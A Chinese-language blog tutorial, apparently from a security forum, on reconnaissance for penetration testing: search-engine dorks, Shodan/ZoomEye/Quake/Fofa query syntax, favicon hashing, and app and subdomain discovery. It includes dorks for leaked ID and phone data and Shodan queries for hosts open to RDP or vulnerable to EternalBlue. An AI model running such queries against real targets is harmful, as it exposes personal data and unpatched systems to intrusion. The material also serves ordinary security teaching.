<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-dd5a3a46140714898648d4afb5209e7cb8c5000e.png" title="image-20240318211310422" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-dd5a3a46140714898648d4afb5209e7cb8c5000e.png">
        
    </a></p>
<h2 id="seosearch-engine-optimization查询" class="headerLink">
    <a href="#seosearch-engine-optimization%e6%9f%a5%e8%af%a2" class="header-mark"></a>SEO(Search Engine Optimization)查询</h2><h3 id="爱站-seo综合查询" class="headerLink">
    <a href="#%e7%88%b1%e7%ab%99-seo%e7%bb%bc%e5%90%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>爱站-SEO综合查询</h3><p><a href="https://www.aizhan.com/cha/" target="_blank" rel="noopener noreferrer">https://www.aizhan.com/cha/</a></p>
<p>可以根据域名来收集目标站点的备案信息、名称、注册人等信息<a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-a078b1f77b41bc109b822dead6f72878a4c953d2.png" title="image-20240318211322521" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-a078b1f77b41bc109b822dead6f72878a4c953d2.png">
        
    </a></p>
<h3 id="站长-seo综合查询" class="headerLink">
    <a href="#%e7%ab%99%e9%95%bf-seo%e7%bb%bc%e5%90%88%e6%9f%a5%e8%af%a2" class="header-mark"></a>站长-SEO综合查询</h3><p><a href="http://seo.chinaz.com/" target="_blank" rel="noopener noreferrer">http://seo.chinaz.com/</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-192ff56d8e5ec565530acadd73369738422c9819.png" title="image-20240318211336606" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-192ff56d8e5ec565530acadd73369738422c9819.png">
        
    </a></p>
<h3 id="googlebingbaidu" class="headerLink">
    <a href="#googlebingbaidu" class="header-mark"></a>Google、bing、baidu</h3><p><code>Google</code>需要翻墙，一般用来收集一些敏感信息，用老生常谈的方法</p>
<p>这样收集特定的域名</p>
<p>site:xxx.cn</p>
<p>我通常用来收集特定资产的敏感信息</p>
<p>如 <code>intext:``身份证</code> <code>intext:``电话</code> 再指定后缀 <code>xlsx</code> <code>pdf</code> <code>docs</code>等</p>
<p>另外的时候会收集一些藏的比较深的路由</p>
<p>指定<code>inurl:xxx</code>可能会发现额外的资产</p>
<p>不过相比起<code>Google</code>我更喜欢用<code>Bing</code>，因为不用翻墙</p>
<p>语法的话与<code>Google</code>同理，不过<code>Bing</code>如果用谷歌语法的话搜集的内容会模糊一些，不是精准搜索</p>
<p><a href="https://cn.bing.com/" target="_blank" rel="noopener noreferrer">https://cn.bing.com/</a></p>
<p>最后就是百度，也是搜集信息的一种方式</p>
<p>Ps:``搜索引擎一般用来收集信息泄露和隐藏较深的路由</p>
<p>这里给大家推荐一个网站 (本人也是看别人的知道的【信息收集之-你不知道的骚思路】<a href="https://www.bilibili.com/video/BV1yP4y117Q2?vd_source=6ce69e079d1dd642d7810fbf2e9c817e" target="_blank" rel="noopener noreferrer">https://www.bilibili.com/video/BV1yP4y117Q2?vd_source=6ce69e079d1dd642d7810fbf2e9c817e</a>)</p>
<p>二开谷歌语法&mdash;&mdash;<a href="https://searchtool.drtsrc.com/" target="_blank" rel="noopener noreferrer">https://searchtool.drtsrc.com/</a> (国内版)</p>
<p>-&mdash;&mdash;&mdash;&mdash;&mdash;-<a href="https://dorks.faisalahmed.me/" target="_blank" rel="noopener noreferrer">https://dorks.faisalahmed.me/</a> (国外版)</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-e884f65dc7ebc7a1992994b797c57666c724fdcf.png" title="image-20240318211349607" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-e884f65dc7ebc7a1992994b797c57666c724fdcf.png">
        
    </a></p>
<h2 id="github" class="headerLink">
    <a href="#github" class="header-mark"></a>Github</h2><p>GitHub源码泄露肯定都听说过，但是真正找的源码的案例可能很少，可能是你用的方法有问题，网站域名、网站JS路径、网站备案、网站下的技术支持这些都可以放进去GitHub搜</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-329e15405217eabb9f33e3f97f00690af6f2395b.png" title="image-20240318211404704" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-329e15405217eabb9f33e3f97f00690af6f2395b.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-2158b74be8703460d50a8f68855da3c47875a609.png" title="image-20240318211411084" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-2158b74be8703460d50a8f68855da3c47875a609.png">
        
    </a></p>
<p>精确搜索：被双引号引起来的部分代表精确匹配</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3131445766e66dac6b07a75cbf86b194670d2336.png" title="image-20240318211423694" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3131445766e66dac6b07a75cbf86b194670d2336.png">
        
    </a></p>
<p><strong>Fofa 360</strong> <strong>鹰图 钟馗之眼</strong></p>
<p>鹰图提炼图标很好用</p>
<p>web.icon==&ldquo;4eeb8a8eb30b70af511dcc28c11a3216&rdquo;</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-c5d3c75284a6db7469c0ee707d2c42f55435832e.png" title="image-20240318211439447" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-c5d3c75284a6db7469c0ee707d2c42f55435832e.png">
        
    </a></p>
<p>\=模糊</p>
<p>\==精准</p>
<p>Fofa</p>
<p>icon_hash=&ldquo;174665376&rdquo;</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-95b6f0f1c2fa41fcfef1a1da0ed8e502aa3d1ef2.png" title="image-20240318211452914" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-95b6f0f1c2fa41fcfef1a1da0ed8e502aa3d1ef2.png">
        
    </a></p>
<p>其实，这时候可以发现很多图标，两者是相辅相成的，通过收集图标提炼共性标题，通过收集标题找到共性图标</p>
<p>最好多加个几个精准条件</p>
<p>web.icon==&ldquo;4eeb8a8eb30b70af511dcc28c11a3216&rdquo;&amp;&amp;title=&ldquo;ruoyi&rdquo;</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-67ca4324402cd6f7cf84de1574c0c86d6061076b.png" title="image-20240318211512753" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-67ca4324402cd6f7cf84de1574c0c86d6061076b.png">
        
    </a></p>
<p>`Web``的内容```</p>
<p>body=ruoyi</p>
<p>大家记得多看前端源码</p>
<h3 id="提炼特殊路由" class="headerLink">
    <a href="#%e6%8f%90%e7%82%bc%e7%89%b9%e6%ae%8a%e8%b7%af%e7%94%b1" class="header-mark"></a>提炼特殊路由</h3><p>不同的站点路由其实是不一样的，在这里的话若依站点最特殊的路由是<code>prod-api</code></p>
<p>因此我们从路由的角度来体验</p>
<p>一种是找超链接的提炼方式</p>
<p>body=prod-api/</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-6a523af9532ad5869b4eb9384399e5961d59e822.png" title="image-20240318211634230" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-6a523af9532ad5869b4eb9384399e5961d59e822.png">
        
    </a></p>
<p>可以找到站点中带有若依的超链接路由</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-d8efcb9e369b9753fc23a021fd437501ba970d7d.png" title="image-20240318212159505" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-d8efcb9e369b9753fc23a021fd437501ba970d7d.png">
        
    </a></p>
<p>打开之后我们就可以发现确实超链接指向的是若依的系统</p>
<p>如果收集的若依系统够多，可以发现存在二开的系统有其他的路由，比如<code>admin-api</code> <code>dev-api</code> 等等</p>
<p>另一种方式可能就需要用到搜索引擎去相辅相成的寻找特殊路由</p>
<h3 id="git提炼" class="headerLink">
    <a href="#git%e6%8f%90%e7%82%bc" class="header-mark"></a>GIT提炼</h3><p>很多开源的若依二开可以在<code>github</code>找到相关的项目，往往修改较多的就是默认的<code>prod-api</code>为主，可以按照上面的内容去提炼，这样可以直接收集各个二开若依系统</p>
<h3 id="傻蛋" class="headerLink">
    <a href="#%e5%82%bb%e8%9b%8b" class="header-mark"></a>傻蛋</h3><p>网址：<a href="https://www.shodan.io/" target="_blank" rel="noopener noreferrer">https://www.shodan.io</a></p>
<p>活动：<strong>Shodan*</strong>*黑五1美元一个，淘宝、咸鱼可以看看**</p>
<p>普通：69美元 每月最多 100 万个结果 每月扫描多达 5,120 个 IP 5,120 个 IP 的网络监控</p>
<p>高级：359美元 每月最多 2000 万个结果 每月扫描多达 65,536 个 IP 65,536 个 IP 的网络监控</p>
<p>超级：1099元 每月无限 每月扫描多达 327,680 个 IP 327,680 个 IP 的网络监控</p>
<p>普通与高级功能差别：漏洞搜索过滤器</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-91886143a3662c855eacb265d65427a71892b6a0.png" title="image-20240318212230888" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-91886143a3662c855eacb265d65427a71892b6a0.png">
        
    </a></p>
<h4 id="语法" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95" class="header-mark"></a>语法</h4><ul>
<li>city：搜索指定城市 例如：<strong>city:“tokyo ”</strong></li>
<li>country：搜索指定国家 例如：<strong>country:“JP”</strong></li>
<li>http.title：搜索指定网站标题 列如：<strong>http.title:“hacked by”</strong></li>
<li>http.html：搜索指定网页类容 例如：<strong>http.html:“hello world”</strong></li>
<li>http.status：搜索指定返回响应码 例如：<strong>http.status:“200”</strong></li>
<li>http.server：搜索指定返回中的server类型 例如：<strong>http.server:“PHP”</strong></li>
<li>net：搜索指定网络范围或 IP段，例如：<strong>net:“8.8.0.0/16”</strong></li>
<li>org：搜索指定的组织或机构，例如：<strong>org:“google”</strong></li>
<li>port：搜索指定的端口或服务，例如：<strong>port:“22”</strong></li>
<li>product：搜索指定的操作系统/软件/中间件，列如：<strong>product:“Samsung”</strong></li>
<li>screenshot.label：搜索指定描述图像内容的标签 列如：<strong>screenshot.label:“ics”</strong></li>
<li>os：搜索指定限定系统OS版本， 例如：<strong>os:“Windows Server 2008 R2”</strong></li>
<li>hostname：搜索指定的主机或域名，例如：<strong>hostname:“google”</strong></li>
<li>vuln：搜索指定CVE漏洞编号，例如：<strong>vuln:“CVE-2014-0723”</strong></li>
<li>isp：搜索指定的ISP供应商，例如：<strong>isp:“China Telecom”</strong></li>
<li>version：搜索指定的软件版本，例如：<strong>version:“1.2.3”</strong></li>
<li>geo：搜索指定的地理位置，参数为经纬度，例如：<strong>geo:“44.55,66.77”</strong></li>
</ul>
<h4 id="搜索案例" class="headerLink">
    <a href="#%e6%90%9c%e7%b4%a2%e6%a1%88%e4%be%8b" class="header-mark"></a>搜索案例</h4><p>搜索日本国家，中间件是Apache服务器并且状态码是200的机器</p>
<p>country:&ldquo;JP&rdquo; &amp;&amp; apache &amp;&amp; http.status:&ldquo;200&rdquo;</p>
<p>搜索日本国家，摄像头是海康威视</p>
<p>country:&ldquo;JP&rdquo; &amp;&amp; Hikvision-Webs</p>
<p>搜索日本国家，操作系统是Windows Server 2008 R2并且开放3389端口的机器</p>
<p>country:jp &amp;&amp; os:Windows Server 2008 R2 &amp;&amp; port:3389</p>
<p>搜索日本国家，操作系统是Windows Server并且存在永恒之蓝漏洞的机器(更高级会员才能使用vuln)</p>
<p>country:jp &amp;&amp; os:Windows Server * &amp;&amp; vuln:CVE-2017-0146</p>
<h4 id="shodanhttpssocsdnnetsosearchqshodanspm1001210130017020语法参考资料" class="headerLink">
    <a href="#shodanhttpssocsdnnetsosearchqshodanspm1001210130017020%e8%af%ad%e6%b3%95%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="header-mark"></a><a href="https://so.csdn.net/so/search?q=shodan&amp;spm=1001.2101.3001.7020" target="_blank" rel="noopener noreferrer">shodan</a>语法参考资料</h4><p><a href="https://www.shodan.io/search/filters" target="_blank" rel="noopener noreferrer">Filter Reference</a> <a href="https://www.shodan.io/search/filters" target="_blank" rel="noopener noreferrer">https://www.shodan.io/search/filters</a></p>
<p><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html" target="_blank" rel="noopener noreferrer">Shodan使用指南 - zha0gongz1 - 博客园</a><a href="https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html" target="_blank" rel="noopener noreferrer">https://www.cnblogs.com/H4ck3R-XiX/p/12950736.html</a></p>
<p><a href="https://blog.csdn.net/weixin_41489908/article/details/110404340" target="_blank" rel="noopener noreferrer">暗黑引擎 &ndash; Shodan常用搜索语法_web安全工具库的博客-CSDN博客_shodan搜索语法</a><a href="https://blog.csdn.net/weixin_41489908/article/details/110404340" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/weixin_41489908/article/details/110404340</a></p>
<h3 id="钟馗之眼--知道创宇" class="headerLink">
    <a href="#%e9%92%9f%e9%a6%97%e4%b9%8b%e7%9c%bc--%e7%9f%a5%e9%81%93%e5%88%9b%e5%ae%87" class="header-mark"></a>钟馗之眼&ndash;知道创宇</h3><p><a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreferrer">ZoomEye - Cyberspace Search Engine</a> <a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreferrer">https://www.zoomeye.org/</a></p>
<p>免费： 查询结果展示量：4百条 查询API额度：每月1w</p>
<p>高级：4800/年 查询结果展示量：1千条 查询API额度：每月3w</p>
<p>VIP：9600/年 查询结果展示量：2千条 查询API额度：每月4w</p>
<p>高级与VIP功能差别：蜜罐识别</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-30771c54f4f5c259c5d9688c630a1d08a10d772b.png" title="image-20240318212239297" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-30771c54f4f5c259c5d9688c630a1d08a10d772b.png">
        
    </a></p>
<h4 id="语法-1" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95-1" class="header-mark"></a>语法</h4><ul>
<li>country：搜索指定国家 例如：<strong>country:“JP”</strong></li>
<li>city：搜索指定城市 例如：<strong>city:“San Diego”</strong></li>
<li><a href="https://www.zoomeye.org/searchResult?q=subdivisions:" target="_blank" rel="noopener noreferrer">subdivisions</a>：搜索相关指定行政区的资产 例如：<strong>subdivisions:“*</strong>*东京”**</li>
<li><a href="https://www.zoomeye.org/searchResult?q=ssl.cert.availability:1" target="_blank" rel="noopener noreferrer">ssl.cert.availability</a>：搜索证书是否在有效期内 例如：<strong>ssl:“1”or“0”</strong></li>
<li>ip：搜索指定的IP(ipv4/6) 列如：<a href="https://www.zoomeye.org/searchResult?q=ip:" target="_blank" rel="noopener noreferrer">ip:</a><strong>“8.8.8.8”</strong></li>
<li>cidr：搜索指定的IP段 列如：<a href="https://www.zoomeye.org/searchResult?q=cidr:52.2.254.36/24" target="_blank" rel="noopener noreferrer">cidr:</a><strong>“52.2.254.36/24”</strong></li>
<li>org：搜索指定的组织或机构，例如：<strong>org:“google”</strong></li>
<li>isp：搜索相关网络服务提供商的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=isp:" target="_blank" rel="noopener noreferrer">isp:</a><strong>“China Mobile”</strong></li>
<li>port：搜索指定的端口或服务，例如：<strong>port:“22”</strong></li>
<li>hostname：搜索相关IP&quot;主机名&quot;的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=hostname:google.com" target="_blank" rel="noopener noreferrer">hostname:</a><strong>“google.com”</strong></li>
<li>site：搜索域名相关的资产 例如：<a href="https://www.zoomeye.org/searchResult?q=site:baidu.com" target="_blank" rel="noopener noreferrer">site:</a><strong>“baidu.com”</strong></li>
<li>device：搜索路由器相关的设备类型 例如：<a href="https://www.zoomeye.org/searchResult?q=device:" target="_blank" rel="noopener noreferrer">device:</a><strong>“router”</strong></li>
<li>os：搜索指定限定系统OS版本， 例如：<strong>os:“Windows Server 2008 R2”</strong></li>
<li>title：搜索指定网页类容 例如：<a href="https://www.zoomeye.org/searchResult?q=title:" target="_blank" rel="noopener noreferrer">title:</a><strong>“hello world”</strong></li>
<li>app：搜索指定的组件 列如：<strong>app:“apache ”</strong></li>
<li>ver：搜索指定的版本 l例如：<strong>ver“1.2.3”</strong></li>
<li>service：指定服务类型 例如：<strong>service:“ftp”</strong></li>
</ul>
<h4 id="钟馗之眼语法参考资料" class="headerLink">
    <a href="#%e9%92%9f%e9%a6%97%e4%b9%8b%e7%9c%bc%e8%af%ad%e6%b3%95%e5%8f%82%e8%80%83%e8%b5%84%e6%96%99" class="header-mark"></a>钟馗之眼语法参考资料</h4><p><a href="https://blog.csdn.net/qq_42716969/article/details/105994291" target="_blank" rel="noopener noreferrer">Zoomeye-钟馗之眼语法参考_Pika_mia的博客-CSDN博客_zoomeye语法</a></p>
<p><a href="https://blog.csdn.net/ncafei/article/details/63683377" target="_blank" rel="noopener noreferrer">zoomeye用户使用手册_ncafei的博客-CSDN博客_zoomeye</a></p>
<p><a href="https://www.cnblogs.com/someone9/p/8688636.html" target="_blank" rel="noopener noreferrer">ZoomEye（钟馗之眼）搜索技巧记录： - _H0f - 博客园</a></p>
<p><a href="https://www.freebuf.com/sectool/163782.html" target="_blank" rel="noopener noreferrer">信息收集利器：ZoomEye - FreeBuf网络安全行业门户</a></p>
<h3 id="360-quake--360" class="headerLink">
    <a href="#360-quake--360" class="header-mark"></a>360 QUAKE&ndash;360</h3><p><a href="https://quake.360.cn/quake/#/index" target="_blank" rel="noopener noreferrer">360网络空间测绘 — 因为看见，所以安全</a></p>
<p>免费 数据广度开放性：5百条 Quake积分：3千/月</p>
<p>高级：299/年 数据广度开放性：5千条 Quake积分 ：3W/月</p>
<p>终身：999 数据广度开放性：1W条 Quake积分 ：5W/月</p>
<p>功能差别：相似图标、深度识别、专用语法、圈内交流</p>
<p><strong>邀请码： Cm2TX9</strong></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-b445c2758c9e2882e50979d8dffcf86f0d5bdbb8.png" title="image-20240318212247742" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-b445c2758c9e2882e50979d8dffcf86f0d5bdbb8.png">
        
    </a></p>
<h4 id="语法-2" class="headerLink">
    <a href="#%e8%af%ad%e6%b3%95-2" class="header-mark"></a>语法</h4><ul>
<li>country：搜索指定国家（中文添加_cn） 例如：<strong>country:“JP”</strong></li>
<li>city：搜索指定城市 例如：<strong>city:“tokyo ”</strong></li>
<li>owner：搜索IP归属单位 例如：<strong>owner:“tencent.com”</strong></li>
<li>isp：搜索IP归属运营商 例如：<strong>isp:“amazon.com”</strong></li>
<li>ip：查询IP地址或网段 列如：<strong>ip:&ldquo;1.1.1.1/22&rdquo;</strong></li>
<li>is_ipv6：查询IPV6格式的IP 列如：<strong>sis_ipv6:&ldquo;true&rdquo;</strong></li>
<li>port：搜索指定的端口或服务 例如：<strong>port:“[50 TO 60]”</strong></li>
<li>transport：查询udp数据 例如：<strong>transport:“udp”</strong></li>
<li>domain：查询资产域名 例如：<strong>domain:“google.com”</strong></li>
<li>hostname：查询主机名包含指定资产的数据 例如： <strong>hostname:“google.com”</strong></li>
<li>app：搜索指定的组件 列如：<strong>app:“apache ”</strong></li>
<li>response：查询端口原生返回数据中包含指定参数的资产 列如：<strong>response:“google.com”</strong></li>
</ul>
<h3 id="相应网站" class="headerLink">
    <a href="#%e7%9b%b8%e5%ba%94%e7%bd%91%e7%ab%99" class="header-mark"></a>相应网站</h3><p><a href="https://search.censys.io/" target="_blank" rel="noopener noreferrer">Censys Search</a></p>
<p><a href="https://www.greynoise.io/" target="_blank" rel="noopener noreferrer">GreyNoise</a></p>
<p><a href="https://zhidao.baidu.com/question/750335434727022652.html" target="_blank" rel="noopener noreferrer">各个国家代码是什么？_百度知道</a></p>
<p><a href="https://github.com/0x727/Space_view" target="_blank" rel="noopener noreferrer">https://github.com/0x727/Space_view</a></p>
<h3 id="聚合测绘空间搜索工具" class="headerLink">
    <a href="#%e8%81%9a%e5%90%88%e6%b5%8b%e7%bb%98%e7%a9%ba%e9%97%b4%e6%90%9c%e7%b4%a2%e5%b7%a5%e5%85%b7" class="header-mark"></a>聚合测绘空间搜索工具</h3><p>项目名称：聚合测绘空间搜索（<strong>HW*</strong>*蓝队情报收集**） 项目地址：<a href="https://github.com/atdpa4sw0rd/Search-Tools" target="_blank" rel="noopener noreferrer">https://github.com/atdpa4sw0rd/Search-Tools</a></p>
<p>支持搜索的引擎：<strong>Fofa*</strong>*、Zoomeye、Quake、Shodan、Censys、BinaryEdge、threatbook**</p>
<p>1. git clone <a href="https://github.com/atdpa4sw0rd/Search-Tools.git" target="_blank" rel="noopener noreferrer">https://github.com/atdpa4sw0rd/Search-Tools.git</a><br>
2. cd Search-Tools &amp;&amp; pip3 install -r requirements.txt<br>
3. python3 search_main.py</p>
<h2 id="app小程序公众号信息收集" class="headerLink">
    <a href="#app%e5%b0%8f%e7%a8%8b%e5%ba%8f%e5%85%ac%e4%bc%97%e5%8f%b7%e4%bf%a1%e6%81%af%e6%94%b6%e9%9b%86" class="header-mark"></a>APP、小程序、公众号信息收集</h2><h2 id="1app信息搜集" class="headerLink">
    <a href="#1app%e4%bf%a1%e6%81%af%e6%90%9c%e9%9b%86" class="header-mark"></a>1、APP信息搜集</h2><h3 id="11七麦数据" class="headerLink">
    <a href="#11%e4%b8%83%e9%ba%a6%e6%95%b0%e6%8d%ae" class="header-mark"></a>1.1、七麦数据</h3><p><a href="https://www.qimai.cn/" target="_blank" rel="noopener noreferrer">https://www.qimai.cn/</a></p>
<p>通过当前APP查询所属公司的所有APP</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-5a0e64e9f22d7e8ffe8716a468c9b432c0205b6a.png" title="image-20240318212256021" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-5a0e64e9f22d7e8ffe8716a468c9b432c0205b6a.png">
        
    </a></p>
<p>通过当前APP查询同开发者应用</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-43bdbe80295303d8a4306db84e5e246a2ba9ca6e.png" title="image-20240318212301308" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-43bdbe80295303d8a4306db84e5e246a2ba9ca6e.png">
        
    </a></p>
<h3 id="12appstore安卓和ios" class="headerLink">
    <a href="#12appstore%e5%ae%89%e5%8d%93%e5%92%8cios" class="header-mark"></a>1.2、AppStore(安卓和IOS)</h3><p>查询同开发者应用</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3e73f4a78b398a26f0f06094cfcafff57be4876a.png" title="image-20240318213120983" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3e73f4a78b398a26f0f06094cfcafff57be4876a.png">
        
    </a></p>
<h2 id="2微信公众号和小程序" class="headerLink">
    <a href="#2%e5%be%ae%e4%bf%a1%e5%85%ac%e4%bc%97%e5%8f%b7%e5%92%8c%e5%b0%8f%e7%a8%8b%e5%ba%8f" class="header-mark"></a>2、微信公众号和小程序</h2><p>通过微信搜索公众号并去关注，然后进去点击文章之类的，下拉可以看到它的网页来源，大部分是微信提供的，所以需要去阅读原文，但是原文也可能是第三方提供的，所以还需要自己自行去判断，找到它的url后又可以去爆一波子域名了，</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-4a5a6b737f38931bbfe8bc5289fff45f39b54bf6.png" title="image-20240318213133715" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-4a5a6b737f38931bbfe8bc5289fff45f39b54bf6.png">
        
    </a></p>
<p>随便点击文章通过下拉查看域名，例如：</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-d53e706f4c3fa0fc9dffdd67f5993a9bfdad34e0.png" title="image-20240318213145758" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-d53e706f4c3fa0fc9dffdd67f5993a9bfdad34e0.png">
        
    </a></p>
<h2 id="4logo" class="headerLink">
    <a href="#4logo" class="header-mark"></a>4、logo</h2><p>当你不确定目标产品是什么时，比如你不知道他是谁家的WAF或者路由器，可以利用查看网站logo地址，然后复制logo地址，点击按图片搜索，到谷歌里面查询；也可以把目标logo下载下来，利用上传图片来查询，通过搜索出来的结果可以判断目标产品和厂商。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-19fe23983d34793a19756320b38c79aaccbde945.png" title="image-20240318213245804" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-19fe23983d34793a19756320b38c79aaccbde945.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png" title="image-20240318213250034" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-b0b27b2a69daa400657d01b1456b36f5a58b7909.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png" title="image-20240318214058575" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-f751011831118cbbad3a3af63d1fe895e045f4d1.png">
        
    </a></p>
<h2 id="5faviconico" class="headerLink">
    <a href="#5faviconico" class="header-mark"></a>5、favicon.ico</h2><p>首先先来介绍一下什么favicon.ico文件，所谓favicon，便是其可以让浏览器的收藏夹中除显示相应的标题外，还以图标的方式区别不同的网站。favicon.ico也被称为 website icon（网页图标）、page icon（页面图标）或url icon（URL图标），具体细节请问度娘。下面这个小东西就是 Favicon.ico，我们可以通过在shodan里寻找它的哈希并去查找相关资产，打开shodan页面，或者用shodan插件都行。</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png" title="image-20240318214108788" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-3afa9d1b3afa239c35e19284955beb2a884e13be.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png" title="image-20240318214114650" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-93ada0eed3bb7559a73a349725fdba1fb9821864.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png" title="image-20240318214142064" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-83c0cb9582210821838fd7c6e478b07c66a59022.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png" title="image-20240318214154617" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-5dd1a1e922e1f5b8952a15e74b691026b73747aa.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png" title="image-20240318214159248" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-237c3d3113fe9b9a3189becf8a57907fc8016bf4.png">
        
    </a></p>
<h2 id="三子域名收集挖掘" class="headerLink">
    <a href="#%e4%b8%89%e5%ad%90%e5%9f%9f%e5%90%8d%e6%94%b6%e9%9b%86%e6%8c%96%e6%8e%98" class="header-mark"></a>三、子域名收集(挖掘)</h2><h2 id="1sslhttps证书" class="headerLink">
    <a href="#1sslhttps%e8%af%81%e4%b9%a6" class="header-mark"></a>1、SSL(HTTPS)证书</h2><p>点击浏览器网站旁边的小锁，然后点击证书就可以查看到该网站的SSL证书了</p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-a6949b5126971885b1789786f3fbecb076868c0c.png" title="image-20240318214253774" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-a6949b5126971885b1789786f3fbecb076868c0c.png">
        
    </a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png" title="image-20240318214300153" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-7f5be2e3ea1d8a7e9505b44e446bd05a1cc7a454.png">
        
    </a></p>
<h3 id="11大厂商ssl证书一证多用" class="headerLink">
    <a href="#11%e5%a4%a7%e5%8e%82%e5%95%86ssl%e8%af%81%e4%b9%a6%e4%b8%80%e8%af%81%e5%a4%9a%e7%94%a8" class="header-mark"></a>1.1、大厂商SSL证书一证多用</h3><p>大厂商的SSL证书一般都是<strong>一证多用</strong>，根据证书透明日志这个特性，可以得知一些子域名。</p>
<p>如百度：<a href="https://www.baidu.com/" target="_blank" rel="noopener noreferrer">https://www.baidu.com</a></p>
<p><a class="lightgallery" href="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png" title="image-20240318214312481" data-thumbnail="https://shs3.b.qianxin.com/attack_forum/2024/04/attach-1e7449610f26d26e979b950228ae3b24db5d8ccd.png">
        
    </a></p>
